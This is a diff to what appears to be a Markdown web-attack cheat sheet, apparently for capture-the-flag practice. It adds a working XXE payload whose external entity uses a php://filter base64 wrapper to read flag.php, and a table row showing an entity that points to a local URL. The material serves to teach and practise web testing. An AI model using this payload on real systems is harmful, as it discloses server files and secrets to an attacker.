@@ -639,6 +639,18 @@ done
 
 ## XXE
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=flag.php">
+]>
+<root>
+  <name>&file;</name>
+  <details>aa</details>
+  <date>2026-08-10</date>
+</root>
+```
+
 | **Code**   | **Description**   |
 | --------------|-------------------|
 | `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL |
